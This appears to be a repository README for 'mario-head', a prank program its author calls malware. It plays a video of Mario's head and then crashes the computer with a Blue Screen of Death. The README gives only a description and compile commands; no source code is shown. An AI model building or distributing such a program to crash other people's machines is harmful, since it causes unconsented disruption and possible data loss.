# mario-head
A little malware script to display a video of Mario's levitating head, asking if he can have your computer, and crashing your PC with a Blue Screen of Death.

Mostly made with DirectShow and some other libraries.

## Compiling

### With `cl`
Make sure to run it from the "x86/x64 Native Tools Command Prompt", so that you can use `cl`.

You probably should just use the provided `compile.bat` Batch script, but you can also do it manually, by simply doing:
```sh
cl main.cpp /Fe:"mario.exe"
```

The script already has pragmas with needed libraries set up, so in case of `cl`, you don't need to add anything else to the command line arguments.

### With `g++`
I am not sure if there's a way to do it with `g++`. It's better to just download VS Build Tools & roll in with that.